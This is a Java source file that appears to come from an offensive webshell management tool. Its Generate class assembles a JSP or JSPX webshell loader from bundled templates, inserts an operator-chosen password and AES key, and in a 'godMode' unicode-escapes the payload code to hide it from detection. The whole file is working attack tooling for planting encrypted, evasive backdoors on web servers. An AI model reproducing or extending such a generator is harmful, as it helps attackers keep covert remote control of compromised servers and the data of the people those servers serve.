package vip.youwe.shell.shells.cryptions.JavaAes;

import vip.youwe.shell.core.ApplicationContext;
import vip.youwe.shell.utils.Log;
import vip.youwe.shell.utils.functions;

import javax.swing.*;
import java.io.InputStream;

class Generate {

    private static final String[] SUFFIX = {"jsp", "jspx"};

    public static byte[] GenerateShellLoder(String pass, String secretKey, boolean isBin) {
        byte[] data = null;

        try {
            InputStream inputStream = Generate.class.getResourceAsStream("template/" + (isBin ? "raw" : "base64") + "GlobalCode.bin");
            String globalCode = new String(functions.readInputStream(inputStream));
            inputStream.close();
            globalCode = globalCode.replace("{pass}", pass).replace("{secretKey}", secretKey);
            inputStream = Generate.class.getResourceAsStream("template/" + (isBin ? "raw" : "base64") + "Code.bin");
            String code = new String(functions.readInputStream(inputStream));
            inputStream.close();
            Object selectedValue = JOptionPane.showInputDialog(null, "suffix", "selected suffix", 1, null, SUFFIX, null);
            if (selectedValue != null) {
                String suffix = (String) selectedValue;
                inputStream = Generate.class.getResourceAsStream("template/shell." + suffix);
                String template = new String(functions.readInputStream(inputStream));
                inputStream.close();

                if (ApplicationContext.isGodMode()) {
                    template = template.replace("{globalCode}", functions.stringToUnicode(globalCode)).replace("{code}", functions.stringToUnicode(code));
                } else {
                    template = template.replace("{globalCode}", globalCode).replace("{code}", code);
                }
                data = template.getBytes();
            }

        } catch (Exception e) {
            Log.error(e);
        }
        return data;
    }


    public static void main(String[] args) {
        System.out.println(new String(GenerateShellLoder("123", "key", false)));
    }
}
